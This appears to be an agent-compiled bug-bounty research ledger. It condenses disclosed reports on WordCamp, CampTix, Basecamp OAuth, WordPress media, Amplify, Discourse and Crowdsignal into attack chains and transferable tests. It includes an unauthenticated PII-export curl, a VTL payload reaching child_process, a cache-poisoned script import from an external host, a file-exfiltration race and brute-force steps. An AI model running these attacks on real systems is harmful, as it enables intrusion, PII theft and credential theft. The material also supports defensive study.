THE REQUEST (report's curl, unauthenticated): `curl -i -X POST 'https://central.wordcamp.org/wp-admin/admin-ajax.php' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'action=Export CSV' --data-urlencode 'meetup-details-nonce=invalid' --data-urlencode 'fields[]=Email' --data-urlencode 'fields[]=Address' --data-urlencode 'fields[]=Slack' --data-urlencode 'fields[]=Organizer Name' --data-urlencode 'fields[]=Name'` -> CSV download from `export_to_file_common()` with private organizer fields (the export sets `'public' => false`, "includes private organizer fields": Email, Address, Slack, Organizer Name, Extra Comments, WordPress.org usernames).
DETECTION SIGNAL: any compound guard of shape `!A && B` / `!A && !B` where the intended gate is `!A || !B`; export/report/download handlers hooked to admin_init; an export option `public => false` meaning private fields included; the tell: a deliberately INVALID nonce + NO session makes the export SUCCEED while a sibling handler using `||` refuses the same request (control comparison proves intent).
CHAIN: unauthenticated attacker (no account, no nonce) -> POST the export action with `nonce=invalid` (primitive: the guard only returns for privileged-with-bad-nonce) -> `export_to_file_common()` emits the private CSV (escalation: `public => false` fields — organizer PII) -> unauthenticated mass PII disclosure (emails, physical addresses, Slack handles, WP.org usernames, free-text notes) + CSRF abuse of any browser that can reach wp-admin (impact: program High 8.7).
TRANSFERABLE TEST: on every multi-condition authorization guard: (1) write the truth table of the compound condition and identify the row that FAILS OPEN (here: anonymous + invalid token); (2) send exactly that request — garbage nonce, no session — and read the response body; (3) repeat against a SIBLING handler using the correct `||` pattern as a control; (4) grep the whole codebase for the same operator swap in other handlers. Rule: **`&&` where `||` belongs makes the guard fire only for the least dangerous caller — enumerate the truth table of every compound authz condition and send the fail-open row with a deliberately invalid token; the export/report surface is where this operator swap pays.**
DEDUPE/DELTA: NEW. `wp_verify_nonce|run-report|export_to_file|tix_action` = 0 hits across the three write targets. Recorded neighbour REVIEWED and NOT conflated: ledger 18443 (Roxy-WI "inverted/null-check auth gate" — supplying a non-null value skips a token check; a null-check bypass, not an operator inversion in a compound guard). NEW atoms: the truth-table audit method for compound guards; the `&&`-vs-`||` fail-open row as the unauth request shape. NEW GENERAL METHOD -> §17.719 in /root/Bugbountyskills.md.
FRESHNESS: disclosed 2026-11-05 — INSIDE the preferred window.
HONESTY: not reproduced (no WordCamp stood up this pass); every quote above appears in the fetched report body (live `.json`, VI 5,720 B).

SOURCE: https://hackerone.com/reports/3941626  2026-11-13 (disclosed 2026-11-05; WordPress — WordCamp.org; "Instamojo CampTix: fail-open MAC + webhook Credit without binding payment to order"; VI 6,753 B)
ROUTE: live H1 `.json` via `curl` -> HTTP 200, `visibility: full`, VI read IN FULL — THE ROUTE THAT WORKED.
STATUS: UNVERIFIED (not reproduced — source-review report, no plugin lab this pass; quotes verbatim)
CLASS: business-logic / payment authorization — a signed payment webhook whose MAC DOES NOT COVER THE OBJECT SELECTOR, fails OPEN on an invalid MAC, and never binds the gateway payment to the order (CWE-345 / CWE-807; monetary)
CORE METHOD (verbatim):
  1. ROOT CAUSE, verbatim: "the gateway never verifies and binds the Instamojo payment to the CampTix order (no stored `payment_request_id` / amount)" — three paths share it (`payment_return`, `payment_notify` fail-open, `payment_notify` Credit).
  2. RETURN PATH: `payment_return()` — verbatim `if ( 'draft' == $attendee->post_status ) { return $this->payment_result( $payment_token, CampTix_Plugin::PAYMENT_STATUS_PENDING, $payment_data ); }` — "a draft order's `tix_payment_token` alone triggers `PAYMENT_STATUS_PENDING` with no Instamojo API verification".
  3. FAIL-OPEN MAC: `payment_notify()` computes `$mac_calculated = hash_hmac( "sha1", implode( "|", $data ), $instamojo_salt )` and on mismatch the else branch STILL calls `payment_result( $_REQUEST['tix_payment_token'], PAYMENT_STATUS_PENDING, … )` — "fail-open (invalid auth → pending), not reject".
  4. THE CROSS-CHANNEL SELECTOR: on MAC match, COMPLETED is applied via `$_REQUEST['tix_payment_token']` from the QUERY STRING while "the MAC is computed over the POST body fields only (after unsetting mac)" — checkout embeds the token in the webhook URL (`tix_action=payment_notify&tix_payment_token=…`) and "does not update_post_meta a payment_request_id (or amount) onto the attendee". Verbatim impact: "a legitimate Credit webhook for a cheap payment on the same merchant can complete a different order → publish".
  5. THE CONTROL (intent proof, same plugin): the Razorpay sibling stores `_razorpay_order_id` / `_razorpay_amount`, uses `hash_equals`, and `wp_die`s ("refuse — do not change status") on mismatch/unpaid. "Instamojo was left behind."
DETECTION SIGNAL: any signed webhook/payment/notify endpoint where the MAC/HMAC covers the POST body while an object id (order/token) sits in the query string or URL; an else-branch that CHANGES STATE instead of rejecting; checkout that does not persist the gateway's payment id/amount onto the order; sibling payment methods in the same plugin that DO (the diff is the intent).
CHAIN: attacker with their own draft order (primitive: any ticket buyer) -> `payment_return`/`payment_notify` with their own `tix_payment_token` (primitive: the token is the only selector) -> invalid MAC still marks PENDING (bypass: fail-open) -> a REAL Credit webhook for a cheap payment on the same merchant applies COMPLETED to whichever order the UNSIGNED query token names (escalation: MAC scope excludes the selector; no payment<->order binding) -> expensive order goes `publish`: ticket inventory consumed (`get_purchased_tickets_count`), ticket emails via `email_tickets()`, attendee access (impact: monetary loss at the payment boundary; program High 8.7).
TRANSFERABLE TEST: on every signed webhook/payment/notify endpoint: (1) move the object selector (order id / token) BETWEEN channels (body <-> query <-> path) and re-fire the webhook with a VALID MAC computed only over the body — if the state lands on the selector's object, the signature never bound it; (2) send a deliberately INVALID MAC and check whether the object still changes state (fail-open oracle: `pending`/`processing` counts — anything but reject); (3) complete a REAL cheap payment and replay its signed Credit against a DIFFERENT, expensive order's token — cross-object completion is the monetary oracle; (4) diff sibling payment methods for the bind+amount pattern. Rule: **a signature must cover the parameter that NAMES the object being mutated — if the selector lives outside the signed envelope, a valid signature for one object applies to another; and an invalid signature must reject, never "mark pending".**
DEDUPE/DELTA: NEW. `Instamojo|CampTix|payment_notify|payment_request_id|hash_hmac` = 0 technique hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: the fail-open family (OTP `code=null` at a VERIFY step, §17.201's neighbours; oCIS signed-URL EXPIRY fail-open, §17.212) — both fail-open on a CHECK, not on a MAC over a partial envelope; ledger ~3118 HMAC delimiter-less concatenation (a canonicalisation bug, not a coverage gap); ledger 2794's "unsigned query param" reached via multipart signed-envelope DESYNC (here no desync is needed — the MAC simply never covered the token); the payment family (§17.89 server-owned lifecycle state, ledger ~3048/3055 target-account client-supplied, ~3625 one-time-benefit replay). NEW axes: (a) MAC COVERAGE vs cross-channel object selector; (b) fail-open MAC -> PENDING; (c) missing payment<->order binding proven by the sibling-gateway diff. NEW GENERAL METHOD -> §17.720 in /root/Bugbountyskills.md.
FRESHNESS: disclosed 2026-11-05 — INSIDE the preferred window.
HONESTY: not reproduced (the report itself is a source review: "No live exploitation against production WordCamps is required or requested"); every quote above appears in the fetched report body (live `.json`, VI 6,753 B).

SOURCE: https://hackerone.com/reports/3955956  2026-11-13 (disclosed 2026-10-30; Basecamp / 37signals; "launchpad.37signals.com OAuth AS issues victim-bound credential to unverified attacker redirect → full CIA triad on Basecamp API"; VI 25,469 B)
ROUTE: live H1 `.json` via `curl` -> HTTP 200, `visibility: full`, VI read IN FULL — THE ROUTE THAT WORKED.
STATUS: UNVERIFIED (not reproduced — no 37signals tenant this pass; quotes verbatim)
CLASS: OAuth authorization-server boundary failure — self-service OAuth client registration accepts an ownership-unverified `redirect_uri`, and a still-enabled legacy implicit grant delivers the victim-bound access_token to it (CWE-601-adjacent -> CWE-287; ATO-class credential theft)
CORE METHOD (verbatim):
  1. THE REGISTRATION GAP: `POST /integrations` (multipart/form-data, authenticated session) accepts `integration[redirect_uri] = <attacker-chosen, accepted verbatim>` — "No approval/verification gate. The new client's `client_id` and `client_secret` are rendered on `/integrations/<id>`".
  2. THE STANDARD ANCHOR, verbatim: RFC 9700 §4.1.3 — "the AS MUST require exact redirect-URI matching AND the URI MUST be fully verified at registration... launchpad performs exact matching at authorize/exchange time (good...) but performs no ownership verification at registration. The gap is registration-time trust, not matching."
  3. THE DELIVERY: `GET /authorization/new?client_id=<attacker client_id>&redirect_uri=<attacker redirect>&type=web_server` -> 200 consent -> `POST /authorization` (commit "Yes, I'll allow access") -> 302 `https://<attacker redirect>/cb?code=<8-hex>` — "The code is bound to the authorizing user (the victim), not the registrant."
  4. THE IMPLICIT AMPLIFIER, verbatim: the legacy `type=user_agent` implicit grant "is still enabled (RFC 9700 §4.4 deprecated). It delivers the victim-bound `access_token` directly to the registered redirect in the URL fragment, without `client_secret` and without an authorization-code exchange." Registration also accepts the "RFC 9700-flagged dangerous-redirect set — cleartext `http://` loopback, custom app schemes (`myapp://`), and wildcard host/path".
  5. THE IMPACT PROOF: the stolen Bearer against `3.basecampapi.com` — `GET /<account>/projects.json` -> 200 (C:H), `PUT .../projects/<id>.json` rename -> 200 confirmed server-side (I:H), `DELETE .../projects/<id>.json` -> 204 then 404 (A:H); self-scored `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H = 9.1`, team-rated High 8.0.
DETECTION SIGNAL: any OAuth AS with self-service integration/client registration (`POST /integrations`, "developer console", "create app") — check whether the registered `redirect_uri` gets OWNERSHIP verification (DNS record, file probe, redirect probe) or is trusted verbatim; a grant `type=user_agent` / `response_type=token` still enabled; authorize-time exact matching that MASKS the registration gap.
CHAIN: any authenticated user registers a client with `redirect_uri` = attacker server (primitive: no ownership proof, no scheme validation) -> a VICTIM authorizes it through the AS's own standard consent UI (`UI:R`, not phishing) -> the AS delivers the victim-bound code to the attacker redirect (escalation: a credential representing the victim's consent reaches a redirect the victim has no relationship with) -> with the implicit grant the access_token itself arrives in the fragment with no client_secret -> the bearer reads/renames/deletes the victim's Basecamp projects (impact: full CIA on one stolen credential; program High 8.0, researcher-argued 9.1).
TRANSFERABLE TEST: on every OAuth AS with client registration: (1) register a client with YOUR `redirect_uri` (try `http://` loopback, a custom scheme, and a wildcard) and note any verification step — none = the gap; (2) run the standard authorize as a SECOND user and observe where the code/token lands; (3) try the implicit grant (`type=user_agent` / `response_type=token`) — a token in the fragment with no client_secret is the amplifier; (4) exercise the token against the resource server for read/write/DELETE. Rule: **exact redirect matching at authorize time is not trust — the AS must verify redirect OWNERSHIP at registration; a self-registered redirect that receives ANOTHER user's credential is an authorization-boundary failure, and a live implicit grant removes the last secret gate.**
DEDUPE/DELTA: DELTA over the recorded OAuth families — NO §17 slot. Recorded neighbours REVIEWED: ledger 3479-3483 (GitLab — a duplicated `[trusted]` parameter makes an attacker app skip consent/CSRF and a GET-embeddable `/oauth/authorize?...&redirect_uri=<attacker>` leaks the victim's code -> token -> ATO) owns the "attacker app + attacker redirect_uri + code theft -> token" chain; ledger 1936 is a checklist row ("`redirect_uri` path/parameter tricks, missing `state`, implicit-flow token in fragment"); ledger 5234 (consent-screen scope misrepresentation) and 9623 (social token exchange without app_id check) are different axes. NEW atoms kept: (a) the REGISTRATION-TIME ownership-verification gap as the root defect (vs matching-time; the test is "does registration verify the redirect at all", a different question from "does authorize match it"); (b) the registrant != authorizer framing (the credential represents a THIRD party's consent); (c) the live legacy implicit grant (`type=user_agent`) delivering the token with no client_secret; (d) the accepted dangerous-redirect set (http loopback, custom schemes, wildcard).
FRESHNESS: disclosed 2026-10-30 — INSIDE the preferred window.
HONESTY: not reproduced; every quote above appears in the fetched report body (live `.json`, VI 25,469 B).

SOURCE: https://hackerone.com/reports/3923967  2026-11-13 (disclosed 2026-10-21; WordPress 7.1 development line; "WordPress 7.1 Media Processing Race Enables Persistent PHP File Write and Author-to-RCE"; VI 8,674 B)
ROUTE: live H1 `.json` via `curl` -> HTTP 200, `visibility: full`, VI read IN FULL — THE ROUTE THAT WORKED.
STATUS: UNVERIFIED (not reproduced — needs a WordPress 7.1-line Docker env; quotes verbatim)
CLASS: upload/media-pipeline RCE — a REMOTE `Content-Disposition` filename plants an executable-extension tempfile, a finalize endpoint persists an attacker `original_image` path into attachment metadata, and a race against post-processing generates persistent `.php` image derivatives (CWE-434 / CWE-362 -> RCE)
CORE METHOD (verbatim):
  1. PRECONDITION (report's): the selected temp directory must sit under a PHP-served path — "If `/tmp` is not writable by the user running PHP, WordPress can fall back to another writable temporary directory... making `/tmp` non-writable for the PHP user causes WordPress to fall back to the `wp-content` directory" (e.g. containers with `readOnlyRootFilesystem`).
  2. STEP 1: `POST /wp-json/wp/v2/media?generate_sub_sizes=false` (upload). STEP 2: `POST /wp-json/wp/v2/media/{id}/finalize` — "The route accepts `file` and `original_image` as unrestricted strings, and `finalize_item()` directly assigns the supplied `original_image` into attachment metadata" — poisons `original_image` to an attacker-chosen temp `.php` path.
  3. STEP 3: `POST /wp-json/wp/v2/media` with the `url` parameter -> `download_url()` "honors the remote `Content-Disposition: attachment; filename=malicious.php` value and renames the local temporary file to that attacker-influenced basename, allowing a valid image to briefly exist with an executable extension such as `.php`".
  4. THE RACE: `POST /wp-json/wp/v2/media/{id}/post-process?action=create-image-subsizes` against that temp file — `wp_update_image_subsizes()` takes the original path from the (poisoned) attachment metadata; "If the extension does not identify a known MIME type, `wp_get_image_editor()` deliberately allows the selected image editor to determine the format from the file contents instead of rejecting it based on extension. The derivative filename generator reuses the source extension" -> persistent `.php` derivatives.
  5. PAYLOAD (report's): a ~50MB JPEG with PHP in XMP metadata (`phpinfo();`), served `Content-Type: image/jpeg` + `Content-Disposition: attachment; filename="payload.php"`.
DETECTION SIGNAL: media APIs mutating one attachment through SEVERAL routes (`upload` / `finalize` / `post-process` / sideload-by-`url`); finalize-style endpoints accepting path strings in metadata; a URL-sideload whose REMOTE filename becomes the LOCAL temp basename; image editors that content-sniff when the extension is unknown; derivative filenames reusing the source extension; a temp dir that can resolve under the web root.
CHAIN: any Author account (primitive) -> `/finalize` persists an attacker `original_image` path (primitive: unrestricted metadata strings) -> URL-sideload plants a `.php`-named JPEG in the temp dir (primitive: remote `Content-Disposition` trusted) -> race `/post-process` while the temp file exists (escalation: derivatives generated with `.php`, PHP in XMP survives) -> persistent `.php` image derivatives that "Can be invoked over HTTP without authentication" -> arbitrary PHP as the web user = Author-to-RCE (impact: DB credentials/salts exposure, admin creation; demonstrated on the 7.1 line only, NOT 7.0.3).
TRANSFERABLE TEST: on every multi-step media pipeline: (1) fuzz finalize/metadata endpoints for path fields (`original_image`, `file`, `path`) and persist an attacker path; (2) feed a URL-sideload with `Content-Disposition: attachment; filename=x.<exec-ext>` and check the LOCAL temp basename; (3) race the processing endpoint against that temp file (widening tricks in the sibling entry above); (4) confirm derivative naming reuses the source extension; (5) check where the temp dir resolves when `/tmp` is unavailable. Rule: **a filename a REMOTE server hands your downloader is attacker-controlled — if it sets the local basename, the attacker plants the extension, and any processor that derives files from it propagates execution; finalize/metadata endpoints that persist path strings are the second writer.**
DEDUPE/DELTA: DELTA over the recorded upload families — NO §17 slot. Recorded neighbours REVIEWED: ledger 1957/2696/2716/2795/4578 (upload-name traversal / artifact-metadata traversal / arbitrary file write -> RCE — CLIENT-supplied names and metadata), ledger 3703-3705 (`Content-Disposition: filename=` traversal in a CLIENT TOOL's temp dir). NEW atoms kept: (a) the REMOTE RESPONSE's `Content-Disposition` filename as the extension-plant vector on a SERVER-side downloader (`download_url()`); (b) `finalize`-time path poisoning consumed later as a trusted local image path (the second-writer shape); (c) race-vs-`post-process` + `wp_get_image_editor()` content-sniffing + derivative extension reuse composing to PERSISTENT executable derivatives.
FRESHNESS: disclosed 2026-10-21 — INSIDE the preferred window.
HONESTY: not reproduced; every quote above appears in the fetched report body (live `.json`, VI 8,674 B).

SOURCE: https://hackerone.com/reports/3897236  2026-11-13 (disclosed 2026-10-13; AWS VDP; "RCE in AWS Amplify CLI via Prototype Chain Traversal in amplify-velocity-template"; VI 6,051 B)
ROUTE: live H1 `.json` via `curl` -> HTTP 200, `visibility: full`, VI read IN FULL — THE ROUTE THAT WORKED.
STATUS: UNVERIFIED (not reproduced — no npm lab this pass; quotes verbatim)
CLASS: RCE via prototype-chain traversal in a server-side template engine — raw `baseRef[id]` property resolution with no guard reaches the `Function` constructor (CWE-1321 -> RCE)
CORE METHOD (verbatim):
  1. THE SINK (report code, verbatim): `amplify-velocity-template/src/compile/references.js` — `} else if (type === 'property') { ret = baseRef[id];  // no guard -- resolves constructor, __proto__, etc. }`.
  2. THE PAYLOAD (report's VTL): `#set($x = {})` then `#set($log = $x.toString().constructor.constructor.call($x, "var cp = process.mainModule.require('child_process'); ...").call($x))` — the resolver still returns valid DynamoDB JSON: "No errors were logged."
  3. THE TRIGGER: `amplify mock api` renders `.vtl` resolvers on any GraphQL query (`VelocityTemplate` -> `requestTemplate.render()`; the report's `poc.js` drives the identical call path).
  4. ROOT CAUSE, verbatim: "Upstream `velocityjs` added a prototype-chain denylist in version 2.1.6. The AWS fork never backported it." (fork divergence).
  5. ATTACK SCENARIO: malicious `.vtl` via PR/fork/push -> developer clones and runs `amplify mock api` -> payload runs `child_process.execSync()` with the developer's privileges -> steal `~/.aws/credentials`, `~/.ssh/*`, `~/.npmrc` (CI/CD pivot if `mock api` runs in CI).
DETECTION SIGNAL: any JS template engine evaluating user-influenced templates whose property resolution is raw indexing (`baseRef[id]`, `obj[key]`) with no hasOwnProperty/allowlist; template DSLs (`#set`, `${}`) evaluating property chains; vendor FORKS / vendored copies of upstream template engines — diff upstream security patches (prototype guards, denylists) against the fork's tree.
CHAIN: attacker lands a `.vtl` file in a repo (primitive: PR/fork/push) -> a developer runs the simulator (primitive) -> `{}.toString().constructor.constructor` = `Function` (prototype chain unfiltered) -> `child_process`/`fs` in the dev or CI context -> AWS/SSH/npm token theft -> supply-chain or production pivot (impact: RCE in the developer/CI context; report frames credential theft + CI/CD compromise).
TRANSFERABLE TEST: (1) in any server-side JS template engine, try `{{x.toString().constructor.constructor('return process')()}}` / `#set($x = $x.toString().constructor.constructor...)` — if property chains reach `constructor`, it is RCE, not just template read; (2) audit forks/vendor copies: diff upstream's prototype-guard commits against the fork's tree (a missing backport reopens the class); (3) confirm the resolver still emits "normal" output so the payload hides inside a legit mapping template. Rule: **a template engine that resolves properties by raw indexing hands the attacker the whole prototype chain — `constructor.constructor` is `Function`; and a fork that skipped upstream's prototype guard reopens a closed class, so always diff fork vs upstream for security patches.**
DEDUPE/DELTA: DELTA — NO §17 slot. `baseRef|amplify-velocity|velocityjs` = 0 hits; recorded neighbours REVIEWED: the `constructor.constructor` gadget is recorded CLIENT-side (ledger 3195/5089 Angular CSTI sandbox escapes, 15769 Teams sticker, 18666 IdP-name field) and §17.219's `__reduce__` is a pickle sink; ledger 15558 (ODGEN) is prototype POLLUTION by attacker key, not property-chain READ to `Function`. NEW atoms kept: (a) the SERVER-side (dev tooling) template-eval context where the same gadget is straight RCE; (b) the fork-backport-gap recon habit ("diff upstream security patches against the fork") as a standing test.
FRESHNESS: disclosed 2026-10-13 — INSIDE the preferred window.
HONESTY: not reproduced; every quote above appears in the fetched report body (live `.json`, VI 6,051 B).

SOURCE: https://www.slcyber.io/research/a-jpeg-a-race-and-a-ghost-breaking-discourses-image-pipeline  2026-11-13 (SL Cyber research, reported to Discourse June 2026; surfaced via Intigriti Bug Bytes #241 2026-10-30; read via `web_extract` this pass) — TECHNIQUE 1 of 2 in this source
STATUS: UNVERIFIED (not reproduced — no Discourse lab this pass; quotes verbatim)
CLASS: web cache poisoning via an UNKEYED COOKIE input -> sitewide stored XSS through a first-party strict-dynamic LOADER GADGET (CWE-444-less key omission -> CWE-79)
CORE METHOD (verbatim):
  1. THE KEY OMIT: Discourse caches rendered pages for anonymous visitors in Redis (`lib/middleware/anonymous_cache.rb`); "The cache key includes the request path, `Accept` header, URL scheme, host, and User-Agent, but not the `color_scheme_id` cookie".
  2. POISON: set `color_scheme_id` to a value that reflects into the rendered page; the poisoned response is cached and served to every subsequent anonymous visitor with the same UA — "trivially automated, iterating over a list of common `User-Agent` strings and poisoning each page path covers the vast majority of visitors."
  3. THE CSP BYPASS GADGET (verbatim): the trusted boot script "finds every `<link rel=\"modulepreload\">` with a `data-plugin-name` attribute and dynamically imports its `href`. This is a typical strict-dynamic CSP bypass gadget. By injecting `<link rel=\"modulepreload\" data-plugin-name=\"poc\" href=\"https://example.com/xss.js\">` via the cache poisoning, we hijack this selector."
  4. EXECUTION: the boot script calls `import("https://example.com/xss.js")` — "the attacker's module executes with full trust in the first-party origin" (the attacker's server must send `Access-Control-Allow-Origin` for the dynamic `import()` to succeed).
DETECTION SIGNAL: an anonymous/edge page cache whose KEY you can enumerate (cache headers + Vary) and test against every request input — COOKIES especially (color scheme, locale, currency, theme, AB flags) for reflection while UNKEYED; CSP with `strict-dynamic` plus trusted first-party scripts that discover-load URLs from DOM attributes (`link[rel=modulepreload][data-plugin-name]`, importmaps).
CHAIN: unauthenticated attacker -> request the page with an unkeyed reflected-input cookie (primitive: input missing from the cache key) -> response cached per-User-Agent (primitive) -> every anonymous visitor with that UA renders the injected HTML -> inject the loader-gadget link element (escalation: the site's own trusted script dynamically imports the attacker module under strict-dynamic) -> JS executing in the first-party origin on every cached page for every anonymous visitor = sitewide stored XSS (impact: the report's own "JavaScript execution on every page for every anonymous visitor ... exploitable without authentication"; anonymous-cache scope noted honestly).
TRANSFERABLE TEST: (1) diff the cache KEY against every request input — set one cookie/header/param at a time to a marker and check whether the next request WITHOUT it still serves your marker (unkeyed-input oracle); (2) poison the cache through the unkeyed input; (3) find a strict-dynamic gadget: grep first-party JS for `modulepreload`, `data-plugin-name`, importmaps, any selector-driven `import()`; (4) plant the gadget element in the poisoned HTML and confirm module execution. Rule: **the cache key is an implicit allowlist of inputs — every input NOT in it is a poisoning vector, and under `strict-dynamic` an attacker-supplied element that the site's own loader imports is trusted code.**
DEDUPE/DELTA: DELTA over the recorded cache-poisoning family (ledger 2269 / 2388-2391 — poisoning via HTTP REQUEST SMUGGLING -> stored XSS on a login page) — NEW GENERAL METHOD -> §17.721 in /root/Bugbountyskills.md (the vector class — unkeyed-input poisoning — and the gadget class — trusted-loader import under strict-dynamic — are both absent from the three write targets: `color_scheme|anonymous cache|strict-dynamic|data-plugin-name` = 0 technique hits; the `modulepreload` hits in Bugbountyskills.md 13507/16533/19200 are the importmap 404 "bundle never runs" gotcha, a different subject). NEW axes: (a) the poisoning vector is an unkeyed COOKIE (no smuggling needed); (b) the XSS vehicle is a first-party dynamic-import gadget, not a reflection sink.
FRESHNESS: reported June 2026, published before 2026-10-30 — INSIDE the preferred window.
HONESTY: not reproduced; every quote above appears in the fetched article body (live `web_extract`).

SOURCE: https://www.slcyber.io/research/a-jpeg-a-race-and-a-ghost-breaking-discourses-image-pipeline  2026-11-13 (same source as the previous entry) — TECHNIQUE 2 of 2
STATUS: UNVERIFIED (not reproduced; quotes verbatim)
CLASS: arbitrary file read/write via a TOCTOU CONTENT-SWAP in the image upload pipeline + ImageMagick MSVG/MSL coder (CWE-367 -> CWE-22/CWE-73; chain-to-RCE documented)
CORE METHOD (verbatim):
  1. THE RACE SHAPE: `extract_image_info` is "the last point where the file content is checked and `@image_info.type` is set"; later steps (`dominant_color`, `optimize!`, `store_upload`) re-read the same path. "The PS execution primitive opens a race condition scenario: 1. Upload a `.msvg` file with valid JPEG content. 2. Use the PS execution to replace the file content after `extract_image_info`... 3. When `dominant_color` runs, it reads the replaced SVG content, triggering the MSVG coder → MSL execution → arbitrary file read."
  2. THE SWAP MECHANISM (verbatim): "We use `renamefile` (POSIX `rename()`) instead of `(w) file` because truncation modifies the inode itself, every open file descriptor sees the change... With `renamefile`, the old inode stays intact for open fds while the path points to the new SVG content. This makes the race timing non-critical."
  3. WINDOW WIDENING (verbatim): target `jpegoptim` in Discourse's `optimize!` step — a 6324x6324 progressive JPEG padded with APP0 markers to ~1MB turns "a 236KB JPEG into a ~25s processing bottleneck while len (jpeg) < 1_000_000" (the report's `bomb.jpg` generator).
  4. POLICY BYPASS NOTES: the PS module is blocked by policy, so the chain uses "GhostScript delegation via PDF, the MSVG coder bypassing librsvg" and GS operators like `filenameforall` and `renamefile` that work "under `-dSAFER`" — MSL `file`/`renamefile` gives arbitrary file read/write (example: copy `/etc/passwd` to `/tmp/passwd`).
  5. EXFIL (verbatim): write MSL output to `/tmp/exfil.png`, then "run the same race a second time... the spray copies `/tmp/exfil.png` over the victim's tempfile. When `store_upload` runs, it opens a new fd from `@file.path`, reads the exfil image, and stores it as a normal upload. The response JSON contains the URL, no path guessing needed."
  6. ESCALATION (report's): "this primitive could likely be escalated to RCE. An attacker could target `/proc/self/environ` or deployment configuration files to recover Rails secrets such as `secret_key_base`; with a suitable signed-message deserialization sink, that key can be used to forge a malicious payload" (the 2019 Rails "DoubleTap" pattern, CVE-2019-5418/5420).
DETECTION SIGNAL: an upload pipeline with MULTIPLE sequential passes over one tempfile (type sniff -> optimize -> analyze -> store) where TYPE is set ONCE and later passes trust it; any processing step slow enough to race (image optimizers, AV scans, thumbnailers); ImageMagick with the MSVG coder or GhostScript delegation; the tell: a converter whose behavior depends on CONTENT after the app has committed to a type.
CHAIN: any Trust Level 0 user uploads `.msvg` with valid JPEG content (primitive) -> after `extract_image_info`, GS `renamefile` swaps in SVG content (TOCTOU; timing non-critical) -> `dominant_color` selects the MSVG coder -> MSL executes (primitive: coder chosen by content, extension irrelevant) -> arbitrary server file read/write -> second race plants the exfil output into the victim tempfile so `store_upload` SERVES it (escalation: exfil through the attacker's own upload URL) -> arbitrary file read demonstrated; report's documented chain: `/proc/self/environ`/config -> `secret_key_base` -> forged signed message -> deserialization RCE ("a potential path to complete server compromise").
TRANSFERABLE TEST: on any multi-pass image/media pipeline: (1) map the passes — which step decides TYPE, which re-reads CONTENT; (2) upload a polyglot and swap the content after the type-check, widening the window with the pipeline's own slowest step (padded progressive JPEG for jpegoptim, oversized PNG, AV scan) and swapping via an inode-preserving rename when you control a converter operator; (3) aim the swapped content at a powerful coder (MSL/MVG/SVG, PDF->GS delegation); (4) exfil by re-racing the STORE step so the app serves your output file through the victim's own upload. Rule: **when one file is checked once and re-read many times, the type-check is a race window — widen it with the pipeline's slowest step, swap content with a rename that keeps open fds on the old inode, and exfil through the store step instead of guessing paths.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.722 in /root/Bugbountyskills.md. `dominant_color|extract_image_info|store_upload|jpegoptim|MSVG|MSL` = 0 technique hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: ledger 2328-2330 (upload pipelines shelling to exiftool/ffmpeg/ImageMagick with an EVAL-parser payload — direct code-execution parser bugs, no race); ledger 5322-5350 (TikTok ffmpeg HLS playlist SSRF/LFR — demuxer resolves segment URLs); the race family (§17.203 entitlement race, ledger 10482 email-change OTP race, 14012 GHES detached-repo GraphQL race — none is a content-swap TOCTOU on one tempfile); ledger 2189/2293/2300-2302 (file read -> `secret_key_base` -> forged session — the same TERMINAL, reached here via the race+MSL primitive). NEW axes: (a) check-once/re-read-many content-swap TOCTOU; (b) the jpegoptim slowdown bomb as a deterministic window widener; (c) inode-preserving `renamefile` making timing non-critical; (d) exfil via re-racing the store step.
FRESHNESS: reported June 2026 — INSIDE the preferred window.
HONESTY: not reproduced; every quote above appears in the fetched article body (live `web_extract`).

SOURCE: https://hackerone.com/reports/905816  2026-11-13 (submitted 2020-06-23, disclosed 2020-11-18; Automattic — Crowdsignal/Polldaddy; reporter `bugra` (Bugra Eskici); weakness "Business Logic Errors"; program severity Low (0.1 ~ 3.9), Resolved, bounty awarded; "No Rate Limit when accessing "Password protection" enabled surveys leads to bypassing passwords via "pd-pass_surveyid" cookie")
ROUTE: live `web_extract` on the report page — FIRST route worked (researcher body + steps + full timeline read).
STATUS: UNVERIFIED (not reproduced — no Crowdsignal survey was created this pass; every quote below is verbatim from the fetched report body)
CLASS: authentication bypass / business logic — a "password protection" gate whose verifier is a STATIC, CLIENT-COMPUTABLE cookie (`pd-pass_<SURVEYID>` = MD5 of the password) checked on the CONTENT-ACCESS request, while the rate limit exists only on the password-SUBMIT request — so the gate is brute-forceable at speed with client-side-hashed payloads (CWE-307/CWE-916 + business logic)
CORE METHOD:
  1. THE VERIFIER (verbatim): "The password protection feature is cookie-based system. In my survey, if you write the right password, system will set this cookie : `pd-pass_DA0C46C4EAECF2BA=81dc9bdb52d04dc20036dbd8313ed055` And basically this is `pd-pass_SURVEYID=md5(password)`, it encrypts the right password with MD5 and if you visit the survey page with this cookie, you can see the survey." — the cookie IS the auth decision: static, unsalted, computable by the client from any candidate.
  2. THE RATE-LIMIT ASYMMETRY (verbatim): "This request is protected with rate limit, that's great. But if you look to response, you will see a cookie... So, I tried to brute force this cookie with Burp Suite's `Payload Processing` feature. (it encrypts your value with any hash type). And it worked, there is no rate limit when directly accessing to the survey page with password cookie." — the limit protects the SUBMIT request; the CONSUMPTION request (GET the survey presenting the cookie) is unlimited.
  3. THE REPRO (report's steps, verbatim): "1. Go to your survey's `Sharing` page and copy the survey ID from `WordPress.com Shortcode` / 2. Turn on intercept on Burp Suite and go to your password protected survey. / 3. And send the GET request to Intruder / 4. Add `pd-pass_YOURSURVEYIDHERE=test` to cookie and set payload position to `test` value. / 5. ... set the `Payload Processing` feature [hash each payload with MD5] / 6. Set the payload type to `Brute forcer` ... 7. Start the attack."
  4. THE OBJECT-ID ORACLE (verbatim): "when you go to a survey without password protection, the survey ID will be inside the source code. And if you enable the password protection after that, the survey ID won't be changed. So, attacker can save the survey ID before the survey creator enable the password protection feature. Also, the `WordPress.com Shortcode` on `Sharing` page leaks the survey ID too."
  5. THE FIX (team, verbatim) confirms which surface was open: "we added rate limiting to the cookie check"; and the retest nuance (researcher, verbatim): "It doesn't work with high threads like 50. It works with low threads like 5, but in real attack scenerio attacker needs high thread."
